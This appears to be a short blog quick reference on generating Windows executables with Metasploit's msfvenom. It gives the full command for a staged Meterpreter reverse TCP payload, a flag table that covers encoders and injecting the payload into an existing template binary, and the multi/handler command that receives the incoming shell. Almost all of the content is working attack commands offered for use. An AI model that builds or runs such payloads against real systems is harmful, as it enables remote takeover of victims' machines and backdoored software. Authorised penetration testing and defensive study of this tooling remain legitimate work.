---
title: "Generating Standalone Windows Executables with msfvenom"
date: 2015-01-08T17:22:37+00:00
url: "/metasploit-payload-executable-exe/"
draft: false
description: "A quick reference for generating staged and stageless Windows Portable Executable (PE) payloads using Metasploit's msfvenom."
categories: ["exploit-dev", "Security"]
tags: ["metasploit", "msfvenom", "meterpreter", "payload-generation", "red-team"]
---

**`msfvenom`** is Metasploit's command-line payload generation and encoding utility (combining the legacy `msfpayload` and `msfencode` tools). It outputs shellcode across hundreds of formats including C arrays, raw binaries, and standalone executables (PE, ELF, Mach-O).

---

### Generating a Standard Windows Reverse TCP Executable

To generate an x86 staged Meterpreter payload packaged as a standalone 32-bit Windows `.exe`:

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
         LHOST=192.168.1.10 \
         LPORT=4444 \
         -a x86 --platform windows \
         -f exe -o payload.exe
```

Inspect the generated binary with `file`:

```bash
file payload.exe
# payload.exe: PE32 executable (GUI) Intel 80386, for MS Windows
```

---

### Key msfvenom Flags

| Flag | Description |
| :--- | :--- |
| **`-p`** | The payload to instantiate (e.g. `windows/x64/meterpreter_reverse_tcp`). |
| **`-a`** | Target CPU architecture (`x86`, `x64`, `armle`, `mips`). |
| **`--platform`** | Target OS platform (`windows`, `linux`, `osx`, `android`). |
| **`-f`** | Output format (e.g. `exe`, `raw`, `c`, `powershell`, `dll`, `elf`). |
| **`-e`** | Encoder module (e.g. `x86/shikata_ga_nai`). |
| **`-b`** | Bad characters to exclude from shellcode (e.g. `-b '\x00\x0a\x0d'`). |
| **`-x`** | Existing binary to use as an executable template. |
| **`-k`** | Injects payload into a background thread, preserving normal template execution. |

---

### Handling Incoming Connections in Metasploit

On your handler system, start the matching `multi/handler`:

```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.10; set LPORT 4444; exploit"
```
